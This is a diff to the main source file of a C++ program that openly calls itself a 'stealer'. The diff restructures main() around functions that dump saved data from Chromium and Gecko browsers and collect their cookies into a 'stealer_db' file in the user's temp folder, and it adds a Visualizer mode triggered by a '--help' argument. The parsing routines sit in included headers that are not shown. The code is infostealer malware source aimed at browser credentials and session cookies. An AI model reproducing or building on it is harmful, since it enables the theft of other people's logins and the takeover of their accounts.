@@ -1,8 +1,9 @@
 #define _CRT_SECURE_NO_WARNINGS
 #define _SILENCE_ALL_CXX17_DEPRECATION_WARNINGS
 
-#include "includes\ChromiumParser.h"
-#include "includes\GeckoParser.h"
+#include "includes/ChromiumParser.h"
+#include "includes/GeckoParser.h"
+#include "includes/Visualizer.h"
 
 std::string stealer_db;
 
@@ -19,7 +20,30 @@ void init_stealer_db()
 	stealer_db = temp_path.string() + stealer_db;
 }
 
-int main()
+BOOL default_settings(std::string converted_username)
+{
+	if (!chromium_parser(converted_username, stealer_db))
+		std::cout << "Chromium Browsers dump failed!" << std::endl;
+
+	if (!gecko_parser(converted_username, stealer_db))
+		std::cout << "Gecko Browsers dump failed!" << std::endl;
+
+	if (!gecko_cookie_collector(converted_username, stealer_db))
+		std::cout << "Gecko Cookie Collector failed!" << std::endl;
+
+	if (!chromium_cookie_collector(converted_username, stealer_db))
+		std::cout << "Chromium Cookie Collector failed!" << std::endl;
+
+	if (std::filesystem::exists(stealer_db)) {
+		std::cout << "Stealer db saved: " << stealer_db << std::endl;
+		return true;
+	}
+	else {
+		return false;
+	}
+}
+
+int main(int argc, char* argv[])
 {
 	std::string converted_username;
 	wchar_t username[MAX_PATH];
@@ -31,18 +55,20 @@ int main()
 	}
 
 	init_stealer_db();
-	if (!chromium_parser(converted_username, stealer_db))
-		std::cout << "Chromium Browsers dump failed!" << std::endl;
 
-	if(!gecko_parser(converted_username, stealer_db))
-		std::cout << "Gecko Browsers dump failed!" << std::endl;
-
-	if(!gecko_cookie_collector(converted_username, stealer_db))
-		std::cout << "Gecko Cookie Collector failed!" << std::endl;
-
-	if (!chromium_cookie_collector(converted_username, stealer_db))
-		std::cout << "Chromium Cookie Collector failed!" << std::endl;
-
-	std::cout << "Stealer db saved: " << stealer_db << std::endl;
+	if (argc > 1)
+	{
+		if (std::string(argv[1]) == "--help")
+		{
+			//Visualize here
+			Visualizer visualizer(converted_username, stealer_db);
+			visualizer.visualization_main();
+		}
+	}
+	else
+	{
+		if (!default_settings(converted_username))
+			return -1;
+	}
 	return 0;
 }
